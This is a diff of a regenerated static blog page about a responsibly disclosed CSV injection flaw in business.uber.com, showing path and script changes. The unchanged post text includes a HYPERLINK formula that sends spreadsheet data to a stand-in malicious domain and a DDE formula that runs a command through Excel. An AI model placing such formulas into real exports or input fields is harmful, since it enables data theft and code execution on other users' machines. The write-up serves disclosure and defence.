@@ -2,17 +2,18 @@
 <html prefix="og: http://ogp.me/ns# article: http://ogp.me/ns/article# " lang="en">
 <head>
 <meta charset="utf-8">
+<base href="http://blog.daviddworken.com/posts/csv-injection-in-businessubercom/csv-injection-in-businessubercom/">
 <meta name="viewport" content="width=device-width, initial-scale=1">
 <title>CSV Injection in business.uber.com | David Dworken's Blog</title>
-<link href="../../assets/css/all-nocdn.css" rel="stylesheet" type="text/css">
-<link rel="alternate" type="application/rss+xml" title="RSS" href="../../rss.xml">
-<link rel="canonical" href="http://blog.daviddworken.com/posts/csv-injection-in-businessubercom/">
-<!--[if lt IE 9]><script src="../../assets/js/html5.js"></script><![endif]--><meta name="author" content="David Dworken">
-<link rel="prev" href="../xss-in-getrushubercom/" title="XSS in getrush.uber.com" type="text/html">
-<link rel="next" href="../xss-in-pypi-and-uber/" title="XSS in pypi (and Uber!)" type="text/html">
+<link href="../../../assets/css/all-nocdn.css" rel="stylesheet" type="text/css">
+<link rel="alternate" type="application/rss+xml" title="RSS" href="../../../rss.xml">
+<link rel="canonical" href="http://blog.daviddworken.com/posts/csv-injection-in-businessubercom/csv-injection-in-businessubercom/">
+<!--[if lt IE 9]><script src="../../../assets/js/html5.js"></script><![endif]--><meta name="author" content="David Dworken">
+<link rel="prev" href="../../xss-in-getrushubercom/xss-in-getrushubercom/" title="XSS in getrush.uber.com" type="text/html">
+<link rel="next" href="../../xss-in-pypi-and-uber/xss-in-pypi-and-uber/" title="XSS in pypi (and Uber!)" type="text/html">
 <meta property="og:site_name" content="David Dworken's Blog">
 <meta property="og:title" content="CSV Injection in business.uber.com">
-<meta property="og:url" content="http://blog.daviddworken.com/posts/csv-injection-in-businessubercom/">
+<meta property="og:url" content="http://blog.daviddworken.com/posts/csv-injection-in-businessubercom/csv-injection-in-businessubercom/">
 <meta property="og:description" content="business.uber.com allows for names to begin with a = which allows for injection of formulas into the downloaded CSVs. There are two main ways that this can be exploited: 
 
 It allows for data exfiltrat">
@@ -24,10 +25,10 @@ It allows for data exfiltrat">
 
 <!-- Menubar -->
 
-<nav class="navbar navbar-inverse navbar-static-top" role="navigation"><div class="container">
+<nav class="navbar navbar-inverse navbar-static-top"><div class="container">
 <!-- This keeps the margins nice -->
         <div class="navbar-header">
-            <button type="button" class="navbar-toggle" data-toggle="collapse" data-target=".navbar-ex1-collapse">
+            <button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#bs-navbar" aria-controls="bs-navbar" aria-expanded="false">
             <span class="sr-only">Toggle navigation</span>
             <span class="icon-bar"></span>
             <span class="icon-bar"></span>
@@ -39,19 +40,16 @@ It allows for data exfiltrat">
             </a>
         </div>
 <!-- /.navbar-header -->
-        <div class="collapse navbar-collapse navbar-ex1-collapse">
+        <div class="collapse navbar-collapse" id="bs-navbar" aria-expanded="false">
             <ul class="nav navbar-nav">
 <li>
-<a href="../../archive.html">Archive</a>
+<a href="../../../archive.html">Archive</a>
                 </li>
 <li>
-<a href="../../categories/index.html">Tags</a>
+<a href="../../../categories/index.html">Tags</a>
                 </li>
 <li>
-<a href="../../rss.xml">RSS feed</a>
-                </li>
-<li>
-<a href="../../resume.pdf">Resume</a>
+<a href="../../../rss.xml">RSS feed</a>
 
                 
             </li>
@@ -78,14 +76,8 @@ It allows for data exfiltrat">
         <div class="metadata">
             <p class="byline author vcard"><span class="byline-name fn">David Dworken</span></p>
             <p class="dateline"><a href="." rel="bookmark"><time class="published dt-published" datetime="2016-04-17T19:30:03-04:00" itemprop="datePublished" title="2016-04-17 19:30">2016-04-17 19:30</time></a></p>
-                <p class="commentline">
-        
-    <a href=".#disqus_thread" data-disqus-identifier="cache/posts/csv-injection-in-businessubercom.html">Comments</a>
-
-
             
-        </p>
-<p class="sourceline"><a href="index.md" id="sourcelink">Source</a></p>
+        <p class="sourceline"><a href="index.md" id="sourcelink">Source</a></p>
 
         </div>
         
@@ -99,8 +91,8 @@ It allows for data exfiltrat">
 </ol>
 <p>1 can be done by setting one's username to something of the form:  <code>"=HYPERLINK("https://maliciousDomain.com/evil.html?data="&amp;A1, "Click to view additional information")"</code>. This will create a cell that will show the text "Click to view additional information" but when clicked will send the data in A1 to <code>maliciousDomain.com</code>. </p>
 <p>2 can be done by setting one's username to something of the form: <code>=cmd|' /C calc'!A0</code> (this will open Windows calculator). If a CSV contains a command like the above, excel will warn the user with two different pop up boxes. The problem is that these boxes ask the user whether they "trust the source of" the file. Since most users will trust Uber as a source, they will click through both of these warnings without worry. </p>
-<p><img alt="firstBox" src="../../firstBox.png"></p>
-<p><img alt="secondBox" src="../../secondBox.png"></p>
+<p><img alt="firstBox" src="../../../firstBox.png"></p>
+<p><img alt="secondBox" src="../../../secondBox.png"></p>
 <p>While it is true that one needs to be an admin on the business page in order to change the username, this still qualifies as a vulnerability (and not simply a self-CSV-injection) since there can be multiple admins. This allows for one admin to get code execution on another admin's computer through the download CSV function. </p>
 <p>Uber patched this by prepending a <code>'</code> to any names starting with <code>=</code>, <code>+</code>, <code>-</code>. </p>
 <p>I reported this to Uber's bug bounty on March 25th, it was triaged on the 28th, and patched on the 30th. A 1000 dollar bounty was awarded on April 6th. You can see the original report <a href="https://hackerone.com/reports/126109">here</a>. </p>
@@ -108,48 +100,26 @@ It allows for data exfiltrat">
     </div>
     <aside class="postpromonav"><nav><ul class="pager hidden-print">
 <li class="previous">
-                <a href="../xss-in-getrushubercom/" rel="prev" title="XSS in getrush.uber.com">Previous post</a>
+                <a href="../../xss-in-getrushubercom/xss-in-getrushubercom/" rel="prev" title="XSS in getrush.uber.com">Previous post</a>
             </li>
             <li class="next">
-                <a href="../xss-in-pypi-and-uber/" rel="next" title="XSS in pypi (and Uber!)">Next post</a>
+                <a href="../../xss-in-pypi-and-uber/xss-in-pypi-and-uber/" rel="next" title="XSS in pypi (and Uber!)">Next post</a>
             </li>
-        </ul></nav></aside><section class="comments hidden-print"><h2>Comments</h2>
-        
-        
-        <div id="disqus_thread"></div>
-        <script>
-        var disqus_shortname ="dworken",
-            disqus_url="http://blog.daviddworken.com/posts/csv-injection-in-businessubercom/",
-        disqus_title="CSV Injection in business.uber.com",
-        disqus_identifier="cache/posts/csv-injection-in-businessubercom.html",
-        disqus_config = function () {
-            this.language = "en";
-        };
-        (function() {
-            var dsq = document.createElement('script'); dsq.async = true;
-            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
-            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
-        })();
-    </script><noscript>Please enable JavaScript to view the <a href="//disqus.com/?ref_noscript" rel="nofollow">comments powered by Disqus.</a>
-</noscript>
-    <a href="//disqus.com" class="dsq-brlink" rel="nofollow">Comments powered by <span class="logo-disqus">Disqus</span></a>
-
-
-        </section></article><script>var disqus_shortname="dworken";(function(){var a=document.createElement("script");a.async=true;a.src="//"+disqus_shortname+".disqus.com/count.js";(document.getElementsByTagName("head")[0]||document.getElementsByTagName("body")[0]).appendChild(a)}());</script>
+        </ul></nav></aside></article>
 </div>
         <!--End of body content-->
 
         <footer id="footer">
-            Contents © 2016         <a href="mailto:david@daviddworken.com">David Dworken</a> - Powered by         <a href="https://getnikola.com" rel="nofollow">Nikola</a>         
+            Contents © 2017         <a href="mailto:david@daviddworken.com">David Dworken</a> - Powered by         <a href="https://getnikola.com" rel="nofollow">Nikola</a>         
             
         </footer>
 </div>
 </div>
 
 
-            <script src="../../assets/js/all-nocdn.js"></script><script>$('a.image-reference:not(.islink) img:not(.islink)').parent().colorbox({rel:"gal",maxWidth:"100%",maxHeight:"100%",scalePhotos:true});</script><!-- fancy dates --><script>
+            <script src="../../../assets/js/all-nocdn.js"></script><script>$('a.image-reference:not(.islink) img:not(.islink)').parent().colorbox({rel:"gal",maxWidth:"100%",maxHeight:"100%",scalePhotos:true});</script><!-- fancy dates --><script>
     moment.locale("");
     fancydates(0, "YYYY-MM-DD HH:mm");
-    </script><!-- end fancy dates --><script>!function(e,a,t,n,c,o,s){e.GoogleAnalyticsObject=c,e[c]=e[c]||function(){(e[c].q=e[c].q||[]).push(arguments)},e[c].l=1*new Date,o=a.createElement(t),s=a.getElementsByTagName(t)[0],o.async=1,o.src=n,s.parentNode.insertBefore(o,s)}(window,document,"script","//www.google-analytics.com/analytics.js","ga"),ga("create","UA-74048408-1","auto"),ga("send","pageview");</script>
+    </script><!-- end fancy dates -->
 </body>
 </html>
